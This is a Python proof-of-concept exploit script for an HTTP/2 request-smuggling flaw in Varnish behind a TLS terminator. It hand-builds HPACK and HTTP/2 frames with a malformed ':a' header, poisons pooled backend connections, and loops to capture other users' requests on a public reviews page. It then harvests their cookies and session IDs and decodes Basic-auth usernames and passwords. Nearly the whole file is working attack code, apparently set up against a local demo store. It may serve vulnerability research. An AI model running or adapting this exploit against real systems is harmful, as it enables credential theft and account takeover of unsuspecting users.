#!/usr/bin/env python3
"""
Varnish HTTP/2 `:a` prefix-match backend request smuggler (TLS-only).

Single-file reproducer. Targets a real-world deployment shape: Varnish sits
behind a TLS terminator (hitch, haproxy, envoy, …) on :443 with ALPN `h2`.
The attacker opens a TLS connection, negotiates h2, then crafts a HEADERS
frame whose HPACK block contains the literal-never-indexed header `:a: xx`
ordered after a `content-length`. A DATA frame follows that becomes a
smuggled HTTP/1.1 request on the recycled backend connection.

The TLS terminator never parses the HPACK — that is the whole point. To it,
everything after the handshake is opaque encrypted application data; the
malformed pseudo-header reaches Varnish byte-for-byte.

Two phases:
  1. measure — probes the backend to determine the post-`:a` leftover length L,
     which is deployment-dependent (varies with X-Forwarded-For, Via, X-Varnish).
  2. exploit — smuggles `POST /api/review` with Content-Length large enough to
     swallow the next victim bereq; the victim's entire HTTP/1.1 request
     (including Cookie / Authorization headers) is stored as a review on the
     record store's public /reviews page, where we poll for it.

Zero external H/2 or HPACK libraries — every byte on the wire is constructed
explicitly below so the reader can see exactly what the exploit does.
"""
from __future__ import annotations

import argparse
import base64
import re
import socket
import ssl
import struct
import sys
import time
import urllib.request

# ── HPACK primitives (RFC 7541) ─────────────────────────────────────────
def hpack_int(value: int, prefix_bits: int, prefix_byte: int) -> bytes:
    """RFC 7541 §5.1 integer representation."""
    max_prefix = (1 << prefix_bits) - 1
    if value < max_prefix:
        return bytes([prefix_byte | value])
    out = bytearray([prefix_byte | max_prefix])
    value -= max_prefix
    while value >= 128:
        out.append((value & 0x7f) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def hpack_str(s) -> bytes:
    """RFC 7541 §5.2 string literal (huffman bit = 0)."""
    b = s.encode() if isinstance(s, str) else s
    return hpack_int(len(b), 7, 0x00) + b


def h_indexed(idx: int) -> bytes:
    """§6.1 indexed header field."""
    return hpack_int(idx, 7, 0x80)


def h_literal_newname(name, value, never_indexed: bool = False) -> bytes:
    """§6.2.2/6.2.3 literal header with new name."""
    first = 0x10 if never_indexed else 0x00
    return bytes([first]) + hpack_str(name) + hpack_str(value)


def h_literal_indexed(idx: int, value, never_indexed: bool = False) -> bytes:
    """§6.2.2/6.2.3 literal header with indexed name."""
    first = 0x10 if never_indexed else 0x00
    return hpack_int(idx, 4, first) + hpack_str(value)


# ── H/2 framing ─────────────────────────────────────────────────────────
H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
FT_DATA, FT_HEADERS, FT_SETTINGS = 0x00, 0x01, 0x04
FL_END_STREAM, FL_END_HEADERS, FL_ACK = 0x01, 0x04, 0x01


def frame(ftype: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    n = len(payload)
    return (
        bytes([(n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff])
        + bytes([ftype, flags])
        + struct.pack(">I", stream_id & 0x7fffffff)
        + payload
    )


def _drain_h2(sock: socket.socket, timeout: float) -> None:
    """Read H/2 frames from sock until `timeout` seconds pass without data."""
    sock.settimeout(timeout)
    try:
        while True:
            try:
                hdr = sock.recv(9)
            except (socket.timeout, TimeoutError):
                return
            if len(hdr) < 9:
                return
            flen = (hdr[0] << 16) | (hdr[1] << 8) | hdr[2]
            remaining = flen
            while remaining > 0:
                chunk = sock.recv(remaining)
                if not chunk:
                    return
                remaining -= len(chunk)
    except Exception:
        return


# ── Build the crafted HPACK block ───────────────────────────────────────
def build_hpack_block(url_path, content_length, extra_headers):
    """Craft the HPACK block that triggers the bug.

    Ordering is load-bearing:
      (1)   :method POST                (indexed, static table idx 3)
      (2)   :path <url_path>             (literal, indexed name idx 4)
      (3)   :scheme https                (indexed, idx 7)
      (4)   content-length: N           REGULAR header placed BEFORE :a so
                                         it appears in the TRUNCATED bereq
      (5)   :a: xx                      THE TRAP — Tstrcmp(":a",":authority")
                                         matches on 2-byte prefix; hdr.b += 6
                                         yields hdr.b == hdr.e → empty slot.
      (6+)  more regular headers         — consumed as body of the first
                                         bereq by the backend's CL-sized read.
    """
    block = b""
    block += h_indexed(3)
    block += h_literal_indexed(4, url_path)
    block += h_indexed(7)
    block += h_literal_newname("content-length", str(content_length))
    block += h_literal_newname(":a", "xx", never_indexed=True)
    for name, value in extra_headers:
        block += h_literal_newname(name, value)
    return block


def _connect(host: str, port: int, timeout: float = 3.0) -> socket.socket:
    """Open a TCP connection, preferring IPv6 when resolving localhost —
    Docker Desktop on macOS routes IPv4 127.0.0.1:<published-port> through
    vpnkit, which corrupts HTTP/2 prior-knowledge framing. Connecting over
    ::1 goes through the native-stack bridge and works correctly.
    """
    infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    infos.sort(key=lambda i: 0 if i[0] == socket.AF_INET6 else 1)
    last_err = None
    for family, kind, _proto, _name, addr in infos:
        try:
            s = socket.socket(family, kind)
            s.settimeout(timeout)
            s.connect(addr)
            return s
        except OSError as e:
            last_err = e
    raise last_err or OSError(f"could not connect to {host}:{port}")


def _tls_wrap(sock: socket.socket, server_name: str) -> ssl.SSLSocket:
    """Wrap a TCP socket with TLS, negotiating ALPN `h2`. Cert validation is
    disabled so the demo's self-signed hitch cert is accepted — a real-world
    attacker against a publicly-trusted cert does not need this override.

    ALPN `h2` is the critical wire fact: hitch selects whichever ALPN protocol
    the client offers (from the pool it advertises), then forwards the
    decrypted bytes verbatim to Varnish. The malformed HPACK block is
    constructed on our side AFTER the TLS handshake, so hitch never parses
    it — it only sees opaque encrypted application data.
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    tls = ctx.wrap_socket(sock, server_hostname=server_name)
    selected = tls.selected_alpn_protocol()
    if selected != "h2":
        raise RuntimeError(
            f"TLS terminator did not negotiate h2 (ALPN = {selected!r}). "
            "Check that hitch is configured with `alpn-protos = \"h2, http/1.1\"`."
        )
    return tls


def send_smuggle(
    host: str, port: int, server_name: str,
    hpack_block: bytes, data_payload: bytes,
) -> None:
    """Open a TLS-wrapped H/2 connection, send HEADERS + DATA on stream 1,
    close. Only TLS is supported — no realistic production Varnish exposes
    cleartext H/2 to untrusted clients, and the whole point of this PoC is
    to show that TLS termination (hitch, haproxy, envoy, …) does not block
    the exploit: the HPACK block is constructed after the handshake and
    flows to Varnish as opaque encrypted application data."""
    sock = _connect(host, port)
    try:
        sock = _tls_wrap(sock, server_name or host)
        sock.sendall(H2_PREFACE + frame(FT_SETTINGS, 0, 0, b""))
        _drain_h2(sock, timeout=0.4)
        sock.sendall(frame(FT_SETTINGS, FL_ACK, 0, b""))
        sock.sendall(frame(FT_HEADERS, FL_END_HEADERS, 1, hpack_block))
        sock.sendall(frame(FT_DATA, FL_END_STREAM, 1, data_payload))
        _drain_h2(sock, timeout=1.5)
    finally:
        try:
            sock.close()
        except Exception:
            pass


# ── /reviews scraping ───────────────────────────────────────────────────
_REVIEW_RE = re.compile(r'<div class="gt-review-text">(.*?)</div>', re.DOTALL)


def fetch_reviews_raw(store_url: str) -> str:
    # Cache-busting query param — Varnish hashes req.url so `?r=<nonce>`
    # produces a cache miss on every fetch.
    url = store_url + f"/reviews?r={time.time():.3f}"
    req = urllib.request.Request(url, headers={"User-Agent": "attacker-probe/1.0"})
    # Polls go through the same TLS terminator as the exploit. The self-signed
    # demo cert isn't trust-store-trusted, so we skip verification — a real
    # attack against a publicly-trusted cert wouldn't need this.
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with urllib.request.urlopen(req, timeout=5.0, context=ctx) as resp:
        return resp.read().decode("utf-8", errors="replace")


def parse_reviews(page_html: str) -> list[str]:
    bodies = _REVIEW_RE.findall(page_html)
    out = []
    for b in bodies:
        # Undo Jinja HTML escaping.
        b = (
            b.replace("&lt;", "<")
             .replace("&gt;", ">")
             .replace("&amp;", "&")
             .replace("&#34;", '"')
             .replace("&#39;", "'")
        )
        out.append(b.strip())
    return out


# ── Phase 1: measure L ──────────────────────────────────────────────────
def measure_leftover_length(
    host: str, port: int, server_name: str, store_url: str,
) -> int:
    """Smuggle a POST /api/review whose BODY is `cl` bytes of 'M'. The body
    is stored as a public review; the Varnish-added leftover headers show up
    as the prefix of that stored body. L = number of bytes before the first
    run of M's in the stored review.
    """
    cl = 300
    data = b"M" * cl
    block = build_hpack_block("/api/review", cl, [("host", "example.com")])

    print("[*] probing for leftover length L …", file=sys.stderr)
    before = set(parse_reviews(fetch_reviews_raw(store_url)))
    try:
        send_smuggle(host, port, server_name, block, data)
    except Exception as e:
        raise SystemExit(
            f"[x] could not reach Varnish at {host}:{port} (SNI={server_name}) — {e}"
        ) from e

    deadline = time.time() + 8.0
    while time.time() < deadline:
        try:
            bodies = parse_reviews(fetch_reviews_raw(store_url))
        except Exception as e:
            print(f"[!] /reviews fetch failed: {e}", file=sys.stderr)
            time.sleep(0.5)
            continue
        new_bodies = [b for b in bodies if b not in before]
        for body in new_bodies:
            m = re.search(r"M{16,}", body)
            if not m:
                continue
            L = m.start()
            if L == 0 or L > 400:
                continue  # weird, skip
            print(f"[+] leftover length L = {L} bytes", file=sys.stderr)
            print(f"[*] leftover prefix (Varnish-added headers after `:a`):",
                  file=sys.stderr)
            preview = body[:L].replace("\r\n", "\\r\\n\n    ")
            print(f"    {preview}", file=sys.stderr)
            return L
        time.sleep(0.3)

    raise SystemExit(
        "[x] could not measure L within 8 seconds. "
        "Check: `docker compose ps` (both services up?), "
        "`curl -k https://groove-therapy.local/` (shop reachable via hitch?), "
        "`docker compose logs varnish | grep feature` (+http2 enabled?)."
    )


# ── Phase 2: smuggle a POST /api/review sized to swallow victim bereq ─
def smuggle_once(
    host: str, port: int, server_name: str, L: int,
    smuggled_cl: int = 800,
) -> None:
    """Send one smuggle that poisons a backend TCP connection in Varnish's
    pool. The smuggled request is `POST /api/review` whose Content-Length is
    sized to swallow the entire next bereq Varnish writes on the poisoned
    connection (300-400 bytes for a typical browser GET).
    """
    smuggled_hdrs = (
        b"POST /api/review HTTP/1.1\r\n"
        b"Host: x\r\n"
        b"Content-Length: " + str(smuggled_cl).encode() + b"\r\n"
        b"Content-Type: text/plain\r\n"
        b"\r\n"
    )
    if len(smuggled_hdrs) > L:
        raise RuntimeError(
            f"measured L={L} bytes is smaller than smuggled-request headers "
            f"({len(smuggled_hdrs)} bytes). Increase attacker-supplied "
            f"post-`:a` headers to pad leftover, or shrink smuggled Host/CL."
        )
    # DATA = L bytes. Wire order (after the bare CRLF) is
    #   [leftover L bytes][DATA L bytes]
    # Backend reads CL=L body bytes = leftover, consuming all L leftover
    # bytes. The NEXT bytes on the wire are our DATA — these become the
    # next request the backend parses. So the smuggled HTTP/1.1 request
    # headers MUST begin at DATA[0].
    tail_filler = b"A" * (L - len(smuggled_hdrs))
    data = smuggled_hdrs + tail_filler
    assert len(data) == L
    block = build_hpack_block("/attacker", L, [("host", "example.com")])
    send_smuggle(host, port, server_name, block, data)


# ── Credential harvest ──────────────────────────────────────────────────
_COOKIE_RE = re.compile(r"Cookie:\s*([^\r\n]+)", re.IGNORECASE)
_AUTH_RE = re.compile(r"Authorization:\s*([^\r\n]+)", re.IGNORECASE)
_BASIC_RE = re.compile(r"^Basic\s+([A-Za-z0-9+/=_-]+)\s*$", re.IGNORECASE)
_SESSION_RE = re.compile(r"session=([A-Za-z0-9._\-+/=]+)")
_REQLINE_RE = re.compile(
    r"^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH) [^ ]+ HTTP/1\.[01]", re.MULTILINE
)


def _decode_basic(value: str):
    """Pull (user, pass) out of a `Basic <b64>` Authorization value. Returns
    (None, None) if not Basic or if decode fails. Tolerates missing padding
    and trailing whitespace — the capture may be truncated mid-signature."""
    m = _BASIC_RE.match(value.strip())
    if not m:
        return None, None
    b64 = m.group(1)
    # Re-pad for tolerant decode; captured headers may arrive without the
    # final `=` if the attacker's CL trimmed the tail.
    b64 += "=" * (-len(b64) % 4)
    try:
        raw = base64.b64decode(b64, validate=False).decode("utf-8", errors="replace")
    except Exception:
        return None, None
    if ":" not in raw:
        return None, None
    u, p = raw.split(":", 1)
    return u, p


def harvest(store_url: str, seen: set) -> list[dict]:
    """Return review bodies we haven't seen yet that contain a Cookie or Auth."""
    page = fetch_reviews_raw(store_url)
    new_hits = []
    for body in parse_reviews(page):
        if body in seen:
            continue
        seen.add(body)
        if _COOKIE_RE.search(body) or _AUTH_RE.search(body):
            new_hits.append(body)
    return new_hits


def pretty_print_capture(body: str, elapsed: float, smuggle_n: int) -> None:
    m = _REQLINE_RE.search(body)
    start = m.start() if m else 0
    preview = body[start : start + 700].replace("\r\n", "\n").rstrip()

    print(f"\n[!!] CAPTURED victim HTTP request ({elapsed:.1f}s, smuggle #{smuggle_n})")
    print("-" * 72)
    print(preview)
    print("-" * 72)

    for c in _COOKIE_RE.findall(body):
        print(f"    Cookie:         {c}")
        for sm in _SESSION_RE.finditer(c):
            print(f"    → session id:  {sm.group(1)}")
    for a in _AUTH_RE.findall(body):
        print(f"    Authorization:  {a}")
        user, pw = _decode_basic(a)
        if user is not None:
            print(f"    → username:    {user}")
            print(f"    → password:    {pw}")
    print()


# ── main loop ───────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="::1",
                    help="TLS-terminator host (default: ::1). Docker Desktop "
                         "on macOS corrupts IPv4 H/2 framing through vpnkit "
                         "even inside TLS when backpressure hits; ::1 uses "
                         "the native-stack bridge and is reliable. Linux "
                         "hosts can use 127.0.0.1 or the LAN IP.")
    ap.add_argument("--port", default=443, type=int,
                    help="TLS-terminator port (default: 443)")
    ap.add_argument("--server-name", default="groove-therapy.local",
                    help="TLS SNI / cert hostname (default: "
                         "groove-therapy.local)")
    ap.add_argument("--interval", default=2.0, type=float,
                    help="seconds between smuggles (default: 2.0). "
                         "Lower values poison faster but exhaust backend "
                         "threads if the victim doesn't appear.")
    ap.add_argument("--smuggled-cl", default=800, type=int,
                    help="Content-Length for the smuggled POST /api/review. "
                         "Sized to match the victim's bereq so the backend's "
                         "CL-sized read completes within one victim request. "
                         "Default 800 fits a typical Chrome GET through the "
                         "full Cookie header + signature. Too large → backend "
                         "hangs waiting for body bytes that never arrive.")
    args = ap.parse_args()

    # /reviews polling goes through the same TLS terminator. IPv6 literals
    # must be bracketed in the URL.
    host_in_url = (
        f"[{args.host}]" if ":" in args.host and not args.host.startswith("[")
        else args.host
    )
    store_url = f"https://{host_in_url}:{args.port}"

    print("=" * 72)
    print("  Varnish HTTP/2 :a prefix-match smuggler (TLS-only)")
    print(f"  target:   {args.host}:{args.port}")
    print(f"  SNI:      {args.server_name}  (ALPN: h2)")
    print(f"  reviews:  {store_url}")
    print("=" * 72)

    L = measure_leftover_length(
        args.host, args.port, args.server_name, store_url,
    )

    print(f"\n[*] entering poisoning loop — sending one smuggle every {args.interval}s")
    print("[*] polling /reviews for captured Cookie / Authorization headers")
    print("[*] waiting for victim traffic (run victim/victim.py in another terminal)\n")

    # Snapshot existing review bodies so we only report new captures.
    seen = set(parse_reviews(fetch_reviews_raw(store_url)))

    t0 = time.time()
    n_smuggles = 0
    n_captures = 0
    try:
        while True:
            try:
                smuggle_once(
                    args.host, args.port, args.server_name, L,
                    smuggled_cl=args.smuggled_cl,
                )
                n_smuggles += 1
            except Exception as e:
                print(f"[!] smuggle failed: {e}", file=sys.stderr)

            try:
                hits = harvest(store_url, seen)
                for body in hits:
                    n_captures += 1
                    pretty_print_capture(body, time.time() - t0, n_smuggles)
            except Exception as e:
                print(f"[!] poll error: {e}", file=sys.stderr)

            if n_smuggles and n_smuggles % 10 == 0:
                print(
                    f"  … smuggles={n_smuggles} captures={n_captures} "
                    f"elapsed={time.time() - t0:.0f}s",
                    file=sys.stderr,
                )

            time.sleep(args.interval)
    except KeyboardInterrupt:
        print(f"\n[*] stopping. {n_smuggles} smuggles sent, {n_captures} captures.")


if __name__ == "__main__":
    main()
